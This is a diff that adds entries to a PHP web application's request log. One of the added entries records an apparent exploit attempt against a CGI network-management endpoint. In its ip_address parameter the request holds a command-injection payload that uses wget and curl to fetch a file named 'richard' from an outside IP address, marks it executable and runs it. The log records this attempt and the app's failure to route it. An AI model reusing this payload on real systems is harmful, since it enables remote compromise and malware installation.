@@ -2776,3 +2776,12 @@ INFO: [ app_end ] --START--
 INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000037s ]
 INFO: [ app_end ] --END-- [ RunTime:0.000062s ]
 
+[ 2019-12-15T23:51:37+08:00 ] 208.97.139.121 /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|wget http://80.82.64.14/richard; curl -O http://80.82.64.14/richard; chmod +x richard; sh richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000039s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000249s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000092s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000119s ]
+ERR: 无法加载控制器:Cgi-bin
+
